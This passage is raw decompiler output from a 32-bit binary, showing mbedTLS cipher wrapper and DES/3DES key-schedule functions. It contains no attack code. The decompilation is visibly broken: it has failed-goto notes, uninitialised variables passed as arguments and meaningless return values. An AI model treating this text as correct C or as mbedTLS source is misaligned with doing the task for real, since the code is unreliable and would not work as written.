            // branch -> 0x8069efd
            // Detected a possible infinite recursion (goto support failed); quitting...
        }
        // 0x8069ef8
        g1 = -0x6100;
        // branch -> 0x8069efd
        // Detected a possible infinite recursion (goto support failed); quitting...
    }
    // 0x8069ef8
    g1 = -0x6100;
    // branch -> 0x8069efd
    // Detected a possible infinite recursion (goto support failed); quitting...
}

// Address range: 0x806a280 - 0x806a2ef
int32_t mbedtls_cipher_set_iv(int32_t * a1, char * a2, int32_t a3) {
    int32_t v1 = (int32_t)a1;
    g6 = (int32_t)a2;
    g4 = a3;
    if (a1 == NULL) {
        // 0x806a29c
        // branch -> 0x806a2a1
        // 0x806a2a1
        return -0x6100;
    }
    int32_t v2 = *a1; // 0x806a2b2
    if (a2 == NULL || v2 == 0) {
        // 0x806a29c
        // branch -> 0x806a2a1
        // 0x806a2a1
        return -0x6100;
    }
    // 0x806a2ba
    if (a3 > 16) {
        // 0x806a2a1
        return -0x6080;
    }
    int32_t v3 = a3; // esi
    int32_t v4 = a3; // 0x806a2cf
    if (*(char *)(v2 + 20) == 1) {
        int32_t v5 = *(int32_t *)(v2 + 16); // 0x806a2e6
        v3 = v5;
        if (v5 > a3) {
            // 0x806a29c
            // branch -> 0x806a2a1
            // 0x806a2a1
            return -0x6100;
        }
        v4 = v5;
    }
    // 0x806a2cc
    memcpy((char *)(v1 + 40), a2, v4);
    *(int32_t *)(v1 + 56) = v3;
    // branch -> 0x806a2a1
    // 0x806a2a1
    return 0;
}

// Address range: 0x806a2f0 - 0x806a39f
int32_t mbedtls_cipher_crypt(int32_t * a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6, int32_t * a7, int32_t a8) {
    g3 = (int32_t)a1;
    g7 = (int32_t)a7;
    g5 = a6;
    int32_t result; // 0x806a399
    if (mbedtls_cipher_set_iv(a1, (char *)a2, a3) == 0) {
        int32_t v1 = g3; // 0x806a322
        if (v1 == 0 || *(int32_t *)v1 == 0) {
            // 0x806a368
            return g6;
        }
        // 0x806a32c
        *(int32_t *)(v1 + 36) = 0;
        int32_t v2 = g5; // 0x806a33a
        if (mbedtls_cipher_update((char *)g3, (char *)a4, a5, v2, (int32_t *)g7, 0, 0, 0) == 0) {
            int32_t v3 = *(int32_t *)g7 + g5; // 0x806a387
            g5 = v3;
            int32_t v4;
            mbedtls_cipher_finish((int32_t *)g3, v3, &v4, v2);
            if (g1 == 0) {
                // 0x806a399
                result = v4;
                int32_t * v5 = (int32_t *)g7; // 0x806a39c_0
                *v5 = *v5 + result;
                // branch -> 0x806a355
            }
        }
    }
    // 0x806a355
    return result;
}

// Address range: 0x806a3f6 - 0x806a3ff
int32_t function_806a3f6(int32_t a1) {
    // 0x806a3f6
    return g7;
}

// Address range: 0x806a400 - 0x806a46f
int32_t mbedtls_cipher_setup(char * a1, int32_t a2) {
    int32_t v1;
    g2 = &v1;
    int32_t v2 = g3; // 0x806a406
    g3 = a2;
    int32_t v3 = g7; // 0x806a40c
    int32_t v4 = (int32_t)a1;
    g7 = v4;
    int32_t v5 = g5; // 0x806a412
    if (a2 == 0 || a1 == NULL) {
        // 0x806a419
        // branch -> 0x806a41e
        // 0x806a41e
        g3 = v2;
        g7 = v3;
        g5 = v5;
        return -0x6100;
    }
    // 0x806a434
    g237 = true;
    g5 = v4;
    g4 = (int32_t)memset(a1, 0, 16);
    int32_t v6 = *(int32_t *)(g3 + 28); // 0x806a43f
    g1 = v6;
    ((int32_t (*)())*(int32_t *)(v6 + 32))();
    g6 = g1;
    *(int32_t *)(g7 + 60) = g1;
    int32_t result; // 0x806a42a_2
    if (g1 != 0) {
        // 0x806a453
        *(int32_t *)g7 = g3;
        mbedtls_cipher_set_padding_mode((int32_t *)g7, 0);
        result = 0;
        // branch -> 0x806a41e
    } else {
        result = -0x6180;
    }
    // 0x806a41e
    g3 = v2;
    g7 = v3;
    g5 = v5;
    return result;
}

// Address range: 0x806a470 - 0x806a48f
int32_t mbedtls_cipher_init(char * a1) {
    // 0x806a470
    g6 = (int32_t)a1;
    g4 = (int32_t)memset(a1, 0, 16);
    return 0;
}

// Address range: 0x806a4f0 - 0x806a4ff
int32_t des3_set3key_dec_wrap(int32_t a1) {
    // 0x806a4f0
    int32_t result;
    int32_t v1;
    mbedtls_des3_set3key_dec(v1, result);
    return result;
}

// Address range: 0x806a500 - 0x806a50f
int32_t des3_set3key_enc_wrap(int32_t a1) {
    // 0x806a500
    int32_t v1;
    int32_t v2;
    int32_t result = mbedtls_des3_set3key_enc(v2, v1); // 0x806a507
    g1 = result;
    return result;
}

// Address range: 0x806a510 - 0x806a52f
int32_t des3_ctx_free(int32_t a1, int32_t a2, int32_t a3) {
    // 0x806a510
    int32_t v1;
    char * v2 = (char *)v1; // bp-4
    int32_t result = mbedtls_des3_free((char *)a1); // 0x806a51d
    g1 = result;
    g2 = (int32_t)v2;
    free(v2);
    return result;
}

// Address range: 0x806a570 - 0x806a57f
int32_t des3_set2key_dec_wrap(int32_t a1) {
    // 0x806a570
    int32_t result;
    int32_t v1;
    mbedtls_des3_set2key_dec(v1, result);
    return result;
}

// Address range: 0x806a580 - 0x806a58f
int32_t des3_set2key_enc_wrap(int32_t a1) {
    // 0x806a580
    int32_t v1;
    int32_t v2;
    int32_t result = mbedtls_des3_set2key_enc(v2, v1); // 0x806a587
    g1 = result;
    return result;
}

// Address range: 0x806a590 - 0x806a59f
int32_t des3_crypt_cbc_wrap(int32_t a1) {
    // 0x806a590
    int32_t v1;
    int32_t v2;
    int32_t result = mbedtls_des3_crypt_cbc(v2, v1, (char)a1, NULL, 0, 0); // 0x806a597
    g1 = result;
    return result;
}

// Address range: 0x806a5a0 - 0x806a5bf
int32_t des3_crypt_ecb_wrap(int32_t a1, int32_t a2, int32_t a3, int32_t a4) {
    // 0x806a5a0
    int32_t v1;
    int32_t v2;
    mbedtls_des3_crypt_ecb(v2, (char *)v1, (char *)a1);
    g1 = 0;
    return 0;
}

// Address range: 0x806a5c0 - 0x806a5df
int32_t des_ctx_free(int32_t a1, int32_t a2, int32_t a3) {
    // 0x806a5c0
    int32_t v1;
    char * v2 = (char *)v1; // bp-4
    int32_t result = mbedtls_des_free((char *)a1); // 0x806a5cd
    g1 = result;
    g2 = (int32_t)v2;
    free(v2);
    return result;
}

// Address range: 0x806a620 - 0x806a62f
int32_t des_setkey_dec_wrap(int32_t a1) {
    // 0x806a620
    int32_t v1;
    int32_t v2;
    mbedtls_des_setkey_dec((int32_t *)v2, v1);
    g1 = 0;
    return 0;
}

// Address range: 0x806a630 - 0x806a63f
int32_t des_setkey_enc_wrap(int32_t a1) {
    // 0x806a630
    int32_t v1;
    int32_t result;
    mbedtls_des_setkey_enc(result, v1);
    return result;
}

// Address range: 0x806a640 - 0x806a64f
int32_t des_crypt_cbc_wrap(int32_t a1) {
    // 0x806a640
    int32_t v1;
    int32_t v2;
    int32_t result = mbedtls_des_crypt_cbc(v2, v1, (char)a1, NULL, 0, 0); // 0x806a647
    g1 = result;
    return result;
}

// Address range: 0x806a650 - 0x806a66f
int32_t des_crypt_ecb_wrap(int32_t a1, int32_t a2, int32_t a3, int32_t a4) {
    // 0x806a650
    int32_t v1;
    int32_t v2;
    mbedtls_des_crypt_ecb(v2, (char *)v1, (char *)a1);
    g1 = 0;
    return 0;
}

// Address range: 0x806a670 - 0x806a69f
int32_t ccm_camellia_setkey_wrap(int32_t a1, int32_t a2, int32_t a3) {
    int32_t result = mbedtls_ccm_setkey(a1, 5, a2, a3); // 0x806a692
    g1 = result;
    int32_t v1;
    g2 = v1;
    return result;
}

// Address range: 0x806a6a0 - 0x806a6cf
int32_t ccm_aes_setkey_wrap(int32_t a1, int32_t a2, int32_t a3) {
    int32_t result = mbedtls_ccm_setkey(a1, 2, a2, a3); // 0x806a6c2
    g1 = result;
    int32_t v1;
    g2 = v1;
    return result;
}

// Address range: 0x806a6d0 - 0x806a6ff
int32_t gcm_camellia_setkey_wrap(int32_t a1, int32_t a2, int32_t a3) {
    int32_t result = mbedtls_gcm_setkey(a1, 5, a2, a3); // 0x806a6f2
    g1 = result;
    int32_t v1;
    g2 = v1;
    return result;
}

// Address range: 0x806a700 - 0x806a72f
int32_t gcm_aes_setkey_wrap(int32_t a1, int32_t a2, int32_t a3) {
    int32_t result = mbedtls_gcm_setkey(a1, 2, a2, a3); // 0x806a722
    g1 = result;
    int32_t v1;
    g2 = v1;
    return result;
}

// Address range: 0x806a730 - 0x806a74f
int32_t camellia_ctx_free(int32_t a1, int32_t a2, int32_t a3) {
    // 0x806a730
    int32_t v1;
    char * v2 = (char *)v1; // bp-4
    int32_t result = g3; // bp-8
    mbedtls_camellia_free((char *)a1);
    g3 = result;
    g2 = (int32_t)v2;
    free(v2);
    return result;
}

// Address range: 0x806a790 - 0x806a79f
int32_t camellia_setkey_dec_wrap(int32_t a1) {
    // 0x806a790
    int32_t v1;
    int32_t v2;
    int32_t result = mbedtls_camellia_setkey_dec((int32_t *)v2, v1, a1); // 0x806a797
    g1 = result;
    return result;
}

// Address range: 0x806a7a0 - 0x806a7af
int32_t camellia_setkey_enc_wrap(int32_t a1) {
    // 0x806a7a0
    int32_t v1;
    int32_t v2;
    int32_t result = mbedtls_camellia_setkey_enc((int32_t *)v2, v1, a1, 0, 0, 0, 0, 0); // 0x806a7a7
    g1 = result;
    return result;
}

// Address range: 0x806a7b0 - 0x806a7bf
int32_t camellia_crypt_ctr_wrap(int32_t a1) {
    // 0x806a7b0
    int32_t v1;
    int32_t v2;
    mbedtls_camellia_crypt_ctr(v2, v1, (int32_t *)a1, 0, 0, 0, 0);
    g1 = 0;
    return 0;
}

// Address range: 0x806a7c0 - 0x806a7cf
int32_t camellia_crypt_cfb128_wrap(int32_t a1) {
    // 0x806a7c0
    int32_t v1;
    int32_t result;
    mbedtls_camellia_crypt_cfb128(result, v1, a1, NULL, 0, 0, 0);
    return result;
}

// Address range: 0x806a7d0 - 0x806a7df
int32_t camellia_crypt_cbc_wrap(int32_t a1) {
    // 0x806a7d0
    int32_t v1;
    int32_t v2;
    int32_t result = mbedtls_camellia_crypt_cbc(v2, v1, (char)a1, NULL, 0, 0); // 0x806a7d7
    g1 = result;
    return result;
}

// Address range: 0x806a7e0 - 0x806a7ef
int32_t camellia_crypt_ecb_wrap(int32_t a1) {
    // 0x806a7e0
    int32_t v1;
    int32_t v2;
    mbedtls_camellia_crypt_ecb((int32_t *)v2, v1, (char *)a1);
    g1 = 0;
    return 0;
}

// Address range: 0x806a7f0 - 0x806a80f
int32_t blowfish_ctx_free(int32_t a1, int32_t a2, int32_t a3) {
    // 0x806a7f0
    int32_t v1;
    char * v2 = (char *)v1; // bp-4
    int32_t result = g3; // bp-8
    mbedtls_blowfish_free((char *)a1);
    g3 = result;
    g2 = (int32_t)v2;
    free(v2);
    return result;
}

// Address range: 0x806a850 - 0x806a85f
int32_t blowfish_setkey_wrap(int32_t a1) {
    // 0x806a850
    int32_t v1;
    int32_t result;
    mbedtls_blowfish_setkey((int32_t *)result, v1, a1);
    return result;
}

// Address range: 0x806a860 - 0x806a86f
int32_t blowfish_crypt_ctr_wrap(int32_t a1) {
    // 0x806a860
    int32_t v1;
    int32_t result;
    mbedtls_blowfish_crypt_ctr(result, v1, (int32_t *)a1, 0, 0, 0, 0);
    return result;
}

// Address range: 0x806a870 - 0x806a87f
int32_t blowfish_crypt_cfb64_wrap(int32_t a1) {
    // 0x806a870
    int32_t v1;
    int32_t result;
    mbedtls_blowfish_crypt_cfb64(result, v1, a1, NULL, 0, 0, 0);
    return result;
}

// Address range: 0x806a880 - 0x806a88f
int32_t blowfish_crypt_cbc_wrap(int32_t a1) {
    // 0x806a880
    int32_t v1;
    int32_t result;
    mbedtls_blowfish_crypt_cbc(result, v1, (char)a1, NULL, 0, 0);
    return result;
}

// Address range: 0x806a890 - 0x806a89f
int32_t blowfish_crypt_ecb_wrap(int32_t a1) {
    // 0x806a890
    int32_t v1;
    int32_t v2;
    mbedtls_blowfish_crypt_ecb((int32_t *)v2, v1, (char *)a1, NULL);
    g1 = 0;
    return 0;
}

// Address range: 0x806a8a0 - 0x806a8bf
int32_t arc4_ctx_free(int32_t a1, int32_t a2, int32_t a3) {
    // 0x806a8a0
    int32_t v1;
    char * v2 = (char *)v1; // bp-4
    int32_t result = g3; // bp-8
    g1 = mbedtls_arc4_free((char *)a1);
    g3 = result;
    g2 = (int32_t)v2;
    free(v2);
    return result;
}

// Address range: 0x806a900 - 0x806a93f
int32_t arc4_setkey_wrap(int32_t a1, int32_t a2, int32_t a3, int32_t a4) {
    // 0x806a900
    g1 = -0x6100;
    int32_t v1;
    if (a3 != 7) {
        // 0x806a913
        g2 = v1;
        return -0x6100;
    }
    // 0x806a918
    mbedtls_arc4_setup((int32_t *)a1, a2, 0);
    g1 = 0;
    g2 = v1;
    return 0;
}

// Address range: 0x806a940 - 0x806a94f
int32_t arc4_crypt_stream_wrap(int32_t a1) {
    // 0x806a940
    int32_t v1;
    int32_t v2;
    mbedtls_arc4_crypt((int32_t *)v2, v1, a1, 0);
    g1 = 0;
    return 0;
}

// Address range: 0x806a950 - 0x806a96f
int32_t ccm_ctx_free(int32_t a1, int32_t a2, int32_t a3) {
    // 0x806a950
    int32_t v1;
    char * v2 = (char *)v1; // bp-4
    int32_t v3 = g3; // 0x806a953
    g3 = a1;
    int32_t result = mbedtls_ccm_free((char *)a1); // 0x806a95d
    g1 = result;
    g3 = v3;
    g2 = (int32_t)v2;
    free(v2);
    return result;
}

// Address range: 0x806aa70 - 0x806aa7f
int32_t aes_setkey_dec_wrap(int32_t a1) {
    // 0x806aa70
    int32_t v1;
    int32_t v2;
    int32_t result = mbedtls_aes_setkey_dec((int32_t *)v2, v1, a1); // 0x806aa77
    g1 = result;
    return result;
}

// Address range: 0x806aa80 - 0x806aa8f
int32_t aes_setkey_enc_wrap(int32_t a1) {
    // 0x806aa80
    int32_t v1;
    int32_t v2;
    int32_t result = mbedtls_aes_setkey_enc((int32_t *)v2, v1, a1); // 0x806aa87
    g1 = result;
    return result;
}

// Address range: 0x806aa90 - 0x806aa9f
int32_t aes_crypt_ctr_wrap(int32_t a1) {
    // 0x806aa90
    int32_t v1;
    int32_t v2;
    mbedtls_aes_crypt_ctr(v2, v1, (int32_t *)a1, 0, 0, 0, 0);
    g1 = 0;
    return 0;
}

// Address range: 0x806aaa0 - 0x806aaaf
int32_t aes_crypt_cfb128_wrap(int32_t a1) {
    // 0x806aaa0
    int32_t v1;
    int32_t v2;
    mbedtls_aes_crypt_cfb128(v2, v1, a1, NULL, 0, 0, 0);
    g1 = 0;
    return 0;
}

// Address range: 0x806aab0 - 0x806aabf
int32_t aes_crypt_cbc_wrap(int32_t a1) {
    // 0x806aab0
    int32_t v1;
    int32_t v2;
    int32_t result = mbedtls_aes_crypt_cbc(v2, v1, (char)a1, NULL, 0, 0); // 0x806aab7
    g1 = result;
    return result;
}

// Address range: 0x806aac0 - 0x806aacf
int32_t aes_crypt_ecb_wrap(int32_t a1) {
    // 0x806aac0
    int32_t v1;
    int32_t v2;
    mbedtls_aes_crypt_ecb(v2, v1, a1, 0);
    g1 = 0;
    return 0;
}

// Address range: 0x806aad0 - 0x806aaef
int32_t mbedtls_des_free(char * a1) {
    int32_t result = (int32_t)a1;
    if (a1 == NULL) {
        // 0x806aaea
        return result;
    }
    // 0x806aada
    g6 = result + 128;
    *(char *)result = 0;
    int32_t result2 = result + 1; // 0x806aae3
    // branch -> 0x806aae0
    while (result2 != g6) {
        // 0x806aae0
        *(char *)result2 = 0;
        result2++;
        // continue -> 0x806aae0
    }
    // 0x806aaea
    // branch -> 0x806aaea
    // 0x806aaea
    return result2;
}

// Address range: 0x806aaf0 - 0x806ab0f
int32_t mbedtls_des3_free(char * a1) {
    int32_t result = (int32_t)a1;
    if (a1 == NULL) {
        // 0x806ab0a
        return result;
    }
    // 0x806aafa
    g6 = result + 384;
    *(char *)result = 0;
    int32_t result2 = result + 1; // 0x806ab03
    // branch -> 0x806ab00
    while (result2 != g6) {
        // 0x806ab00
        *(char *)result2 = 0;
        result2++;
        // continue -> 0x806ab00
    }
    // 0x806ab0a
    // branch -> 0x806ab0a
    // 0x806ab0a
    return result2;
}

// Address range: 0x806ab10 - 0x806ab3f
int32_t mbedtls_des_key_set_parity(int32_t a1) {
    // 0x806ab10
    g1 = 0;
    char * v1 = (char *)a1; // 0x806ab18_0
    unsigned char v2 = *v1; // 0x806ab18
    char v3 = *(char *)((int32_t)(v2 / 2) + (int32_t)&g142); // 0x806ab21
    *v1 = v3;
    int32_t v4 = g1 + 1; // 0x806ab2b
    g1 = v4;
    // branch -> 0x806ab18
    while (v4 != 8) {
        // 0x806ab18
        // 0x806ab18
        v1 = (char *)(a1 + v4);
        v2 = *v1;
        v3 = *(char *)((int32_t)(v2 / 2) + (int32_t)&g142);
        *v1 = v3;
        v4 = g1 + 1;
        g1 = v4;
        // branch -> 0x806ab18
    }
    // 0x806ab33
    return 8;
}

// Address range: 0x806ab40 - 0x806ab7f
int32_t mbedtls_des_key_check_key_parity(int32_t a1) {
    // 0x806ab40
    // branch -> 0x806ab50
    for (uint32_t i = 0; i < 8; i++) {
        unsigned char v1 = *(char *)(i + a1); // 0x806ab50
        char v2 = *(char *)((int32_t)(v1 / 2) + (int32_t)&g142); // 0x806ab5b
        if ((int32_t)v1 != (int32_t)v2) {
            // 0x806ab70
            g1 = 1;
            return 1;
        }
        // 0x806ab63
        // PHI copies at the loop end
        // loop 0x806ab50 end
    }
    // 0x806ab6b
    g1 = 0;
    return 0;
}

// Address range: 0x806ab80 - 0x806afbf
int32_t mbedtls_des_setkey(int32_t a1, char * a2) {
    int32_t v1 = (int32_t)a2;
    unsigned char v2 = *a2; // 0x806ab8c
    unsigned char v3 = *(char *)(v1 + 3); // 0x806ab8f
    unsigned char v4 = *(char *)(v1 + 5); // 0x806ab93
    unsigned char v5 = *(char *)(v1 + 1); // 0x806ab9c
    unsigned char v6 = *(char *)(v1 + 2); // 0x806aba8
    int32_t v7 = 256 * (int32_t)v6 | 0x10000 * (int32_t)v5 | 0x1000000 * (int32_t)v2 | (int32_t)v3; // 0x806abaf
    unsigned char v8 = *(char *)(v1 + 4); // 0x806abb1
    unsigned char v9 = *(char *)(v1 + 7); // 0x806abba
    unsigned char v10 = *(char *)(v1 + 6); // 0x806abbe
    uint32_t v11 = 0x1000000 * (int32_t)v8 | 0x10000 * (int32_t)v4 | (int32_t)v9 | 256 * (int32_t)v10; // 0x806abc7
    int32_t v12 = (v11 / 16 ^ v7) & 0xf0f0f0f; // 0x806abd0
    uint32_t v13 = v12 ^ v7; // 0x806abd6
    int32_t v14 = 16 * v12 ^ v11; // 0x806abdb
    int32_t v15 = (v14 ^ v7) & 0x10101010; // 0x806abe1
    uint32_t v16 = v15 ^ v14; // 0x806abe8
    int32_t v17 = *(int32_t *)(4 * (v13 / 0x200000 % 16) + 0x807daa0); // 0x806abf4
    int32_t v18 = *(int32_t *)(4 * (v13 % 16) + 0x807daa0); // 0x806ac00
    int32_t v19 = *(int32_t *)(4 * (v13 / 0x1000000 % 16) + 0x807daa0); // 0x806ac13
    int32_t v20 = *(int32_t *)(4 * (int32_t)(v2 / 32) + 0x807daa0); // 0x806ac1f
    int32_t v21 = *(int32_t *)(4 * (v13 / 256 % 16) + 0x807daa0); // 0x806ac33
    int32_t v22 = *(int32_t *)(4 * (v13 / 0x10000 % 16) + 0x807daa0); // 0x806ac47
    int32_t v23 = *(int32_t *)(4 * (v13 / 32 % 16) + 0x807daa0); // 0x806ac5d
    int32_t v24 = *(int32_t *)(4 * ((v15 ^ v13) / 0x2000 % 16) + 0x807daa0); // 0x806ac67
    int32_t v25 = *(int32_t *)(4 * (v16 / 0x100000 % 16) + 0x807dae0); // 0x806ac84
    int32_t v26 = *(int32_t *)(4 * v16 / 0x10000000 + 0x807dae0); // 0x806ac90
    int32_t v27 = *(int32_t *)(4 * (v16 / 0x2000000 % 16) + 0x807dae0); // 0x806aca3
    int32_t v28 = *(int32_t *)(4 * (v16 / 2 % 16) + 0x807dae0); // 0x806acb1
    int32_t v29 = *(int32_t *)(4 * (v16 / 512 % 16) + 0x807dae0); // 0x806acc5
    int32_t v30 = (2 * v22 | 4 * v21 | 16 * v20 | v19 | 8 * v18 | 32 * v17 | 128 * v23 | 64 * v24) % 0x10000000; // ecx
    int32_t v31 = *(int32_t *)(4 * (v16 / 0x20000 % 16) + 0x807dae0); // 0x806acdf
    int32_t v32 = *(int32_t *)(4 * (v16 / 16 % 16) + 0x807dae0); // 0x806acf5
    int32_t v33 = *(int32_t *)(4 * (v16 / 0x1000 % 16) + 0x807dae0); // 0x806acff
    int32_t v34 = 0; // ebx
    int32_t v35 = (2 * v31 | 4 * v29 | 8 * v28 | v27 | 16 * v26 | 32 * v25 | 128 * v32 | 64 * v33) % 0x10000000; // edx
    int32_t v36 = 0; // 0x806ae69
    // branch -> 0x806af81
    int32_t result; // 0x806af70
    while (true) {
        // 0x806af81
        uint32_t v37; // 0x806af8a
        uint32_t v38; // 0x806af93
        int32_t v39; // 0x806ad41
        uint32_t v40;
        int32_t v41; // 0x806af9c
        if (v36 != 8) {
            int32_t v42 = v36 - 1; // 0x806ad20
            if (v36 != 15 && v42 != 0 && !((v42 < 0 ^ (v36 & -v36) < 0))) {
                uint32_t v43 = v30; // 0x806ad32
                uint32_t v44 = v35; // 0x806ad3c
                v39 = 4 * v43 & 0xffffffc | v43 / 0x4000000;
                v30 = v39;
                v40 = 4 * v44 | v44 / 0x4000000;
                // branch -> 0x806ad52
              lab_0x806ad52_2:;
                uint32_t v45 = v40 % 0x10000000; // 0x806afa2
                v35 = v45;
                int32_t v46 = v45 / 0x4000; // 0x806ad56
                uint32_t v47 = v45 / 8; // 0x806ad5b
                int32_t v48 = 1024 * v39; // 0x806adbd
                *(int32_t *)(8 * v36 + a1) = 0x10000000 * v39 & 0x10000000 | 16 * v39 & 0x24000000 | v40 & 256 | 0x4000 * v39 & 0x8000000 | 0x40000 * v39 & 0x2080000 | 64 * v39 & 0x1000000 | 512 * v39 & 0x200000 | v39 / 2 & 0x100000 | v48 & 0x40000 | 4 * v39 & 0x20000 | v39 / 1024 & 0x10000 | v40 / 0x2000 & 0x2000 | v40 / 16 & 0x1000 | 64 * v40 & 2048 | v40 / 2 & 1024 | v40 / 32 & 32 | v40 / 1024 & 16 | v46 & 512 | v47 & 8 | v40 / 0x40000 & 4 | v40 / 0x4000000 & 2 | v40 / 0x1000000 % 2;
                uint32_t v49 = v30; // 0x806ae6c
                int32_t v50 = 0x8000 * v49; // 0x806ae70
                uint32_t v51 = v35; // 0x806ae86
                result = v50 & 0x20000000 | v47 & 17 | 0x20000 * v49 & 0x10000000 | v51 & 512 | 0x400000 * v49 & 0x4000000 | v49 / 4 & 0x2000000 | 2 * v49 & 0x1000000 | 0x10000 * v49 & 0x200000 | 2048 * v49 & 0x100000 | 8 * v49 & 0x80000 | v49 / 64 & 0x40000 | v50 & 0x20000 | v49 / 16 & 0x10000 | v48 & 0x8000000 | v51 / 4 & 0x2000 | 256 * v51 & 0x1000 | v51 / 512 & 1024 | 128 * v51 & 256 | v51 / 128 & 32 | 4 * v51 & 4 | v51 / 0x200000 & 2 | v46 & 2056;
                *(int32_t *)(a1 + 4 + 8 * v34) = result;
                int32_t v52 = v34 + 1; // 0x806af79
                v34 = v52;
                if (v52 == 16) {
                    // break -> 0x806afb0
                    break;
                }
                v36 = v52;
                // continue -> 0x806af81
                continue;
            }
            // 0x806af8a
            v37 = v30;
            v38 = v35;
            v41 = 2 * v37 & 0xffffffe | v37 / 0x8000000;
            v30 = v41;
            v39 = v41;
            v40 = 2 * v38 | v38 / 0x8000000;
            // branch -> 0x806ad52
            goto lab_0x806ad52_2;
        }
        // 0x806af8a
        v37 = v30;
        v38 = v35;
        v41 = 2 * v37 & 0xffffffe | v37 / 0x8000000;
        v30 = v41;
        v39 = v41;
        v40 = 2 * v38 | v38 / 0x8000000;
        // branch -> 0x806ad52
        goto lab_0x806ad52_2;
    }
    // 0x806afb0
    return result;
}

// Address range: 0x806afc0 - 0x806afdf
void mbedtls_des_setkey_enc(int32_t a1, int32_t a2) {
    // 0x806afc0
    mbedtls_des_setkey(a1, (char *)a2);
    g1 = 0;
}

// Address range: 0x806afe0 - 0x806b02f
int32_t mbedtls_des_setkey_dec(int32_t * a1, int32_t a2) {
    int32_t v1 = (int32_t)a1;
    int32_t v2 = g3; // 0x806afe4
    g3 = v1;
    mbedtls_des_setkey(v1, (char *)a2);
    int32_t v3 = g3; // edx
    int32_t v4 = 0; // eax
    int32_t * v5 = (int32_t *)g3; // 0x806b000_0
    *v5 = *(int32_t *)(120 + g3);
    int32_t v6 = v4; // 0x806b008
    *(int32_t *)(g3 + 120 + v6) = *v5;
    int32_t * v7 = (int32_t *)(v3 + 4); // 0x806b010_0
    int32_t v8 = *v7; // 0x806b010
    g4 = v8;
    *v7 = *(int32_t *)(g3 + 124 + v6);
    v3 += 8;
    *(int32_t *)(g3 + 124 + v4) = v8;
    int32_t v9 = v4 - 8; // 0x806b01d
    v4 = v9;
    // 0x806b025
    g3 = v2;
    // branch -> 0x806b000
    while (v9 != -64) {
        // 0x806b000
        // 0x806b000
        v5 = (int32_t *)v3;
        *v5 = *(int32_t *)(v9 + 120 + g3);
        v6 = v4;
        *(int32_t *)(g3 + 120 + v6) = *v5;
        v7 = (int32_t *)(v3 + 4);
        v8 = *v7;
        g4 = v8;
        *v7 = *(int32_t *)(g3 + 124 + v6);
        v3 += 8;
        *(int32_t *)(g3 + 124 + v4) = v8;
        v9 = v4 - 8;
        v4 = v9;
        // 0x806b025
        g3 = v2;
        // branch -> 0x806b000
    }
    return 0;
}

// Address range: 0x806b030 - 0x806b0cf
int32_t des3_set2key(int32_t a1, int32_t a2) {
    int32_t v1 = g5; // 0x806b033
    int32_t v2 = g7; // 0x806b036
    g7 = g6;
    int32_t v3 = g3; // 0x806b039
    int32_t v4 = g4 + 8; // 0x806b03a
    g5 = v4;
    g3 = g1;
    mbedtls_des_setkey(g1, (char *)g4);
    mbedtls_des_setkey(g7 + 128, (char *)v4);
    int32_t v5 = 0; // edx
    int32_t v6 = 0; // eax
    int32_t v7 = 0; // 0x806b06c
    int32_t v8 = 0; // 0x806b068
    // branch -> 0x806b068
    while (true) {
        int32_t v9 = *(int32_t *)(v8 + 120 + g3); // 0x806b068
        *(int32_t *)(g7 + 4 * v7) = v9;
        int32_t v10 = *(int32_t *)(g3 + 124 + v5); // 0x806b06f
        *(int32_t *)(g7 + 4 + 4 * v6) = v10;
        int32_t v11 = *(int32_t *)(g7 + 248 + v5); // 0x806b077
        *(int32_t *)(g3 + 128 + 4 * v6) = v11;
        int32_t v12 = v5; // 0x806b085
        int32_t v13 = *(int32_t *)(g7 + 252 + v12); // 0x806b085
        v5 = v12 - 8;
        *(int32_t *)(g3 + 132 + 4 * v6) = v13;
        int32_t v14 = 4 * v6; // 0x806b096
        int32_t v15 = *(int32_t *)(v14 + g3); // 0x806b096
        *(int32_t *)(g3 + 256 + v14) = v15;
        int32_t v16 = 4 * v6; // 0x806b0a0
        int32_t v17 = *(int32_t *)(g3 + 4 + v16); // 0x806b0a0
        *(int32_t *)(g3 + 260 + v16) = v17;
        int32_t v18 = 4 * v6; // 0x806b0ab
        int32_t v19 = *(int32_t *)(v18 + g7); // 0x806b0ab
        *(int32_t *)(g7 + 256 + v18) = v19;
        int32_t v20 = 4 * v6; // 0x806b0b5
        int32_t v21 = *(int32_t *)(g7 + 4 + v20); // 0x806b0b5
        *(int32_t *)(g7 + 260 + v20) = v21;
        int32_t v22 = v6 + 2; // 0x806b0c0
        v6 = v22;
        if (v22 == 32) {
            // 0x806b0c8
            g3 = v3;
            g7 = v2;
            g5 = v1;
            return 32;
        }
        // 0x806b068
        v7 = v22;
        v8 = v5;
        // branch -> 0x806b068
    }
}

// Address range: 0x806b0d0 - 0x806b10f
int32_t mbedtls_des3_set2key_enc(int32_t a1, int32_t a2) {
    // 0x806b0d0
    int32_t v1;
    int32_t v2 = v1; // bp-392
    int32_t v3 = g3; // bp-8
    int32_t v4 = &v2; // 0x806b0d4_3
    g1 = a1;
    g4 = a2;
    g3 = v4;
    g6 = v4;
    des3_set2key(v1, 0);
    *(char *)g3 = 0;
    int32_t v5 = g3 + 1; // 0x806b0f3
    g3 = v5;
    // branch -> 0x806b0f0
    while (v5 != (int32_t)&v3) {
        // 0x806b0f0
        *(char *)v5 = 0;
        v5 = g3 + 1;
        g3 = v5;
        // continue -> 0x806b0f0
    }
    // 0x806b0fa
    g3 = v3;
    int32_t v6;
    return &v6;
}

// Address range: 0x806b110 - 0x806b14f
int32_t mbedtls_des3_set2key_dec(int32_t a1, int32_t result) {
    // 0x806b110
    int32_t v1;
    int32_t v2 = v1; // bp-392
    int32_t v3 = g3; // bp-8
    int32_t v4 = &v2; // 0x806b114_3
    g4 = result;
    g6 = a1;
    g3 = v4;
    g1 = v4;
    des3_set2key(v1, 0);
    *(char *)g3 = 0;
    int32_t v5 = g3 + 1; // 0x806b133
    g3 = v5;
    // branch -> 0x806b130
    while (v5 != (int32_t)&v3) {
        // 0x806b130
        *(char *)v5 = 0;
        v5 = g3 + 1;
        g3 = v5;
        // continue -> 0x806b130
    }
    // 0x806b13a
    int32_t v6;
    g1 = &v6;
    g3 = v3;
    return result;
}

// Address range: 0x806b150 - 0x806b1ff
int32_t des3_set3key(int32_t a1, int32_t a2) {
    int32_t v1 = g5; // 0x806b153
    g5 = g4;
    int32_t v2 = g7; // 0x806b156
    g7 = g6;
    int32_t v3 = g3; // 0x806b159
    g3 = g1;
    mbedtls_des_setkey(g1, (char *)g4);
    int32_t v4 = g5; // 0x806b16b
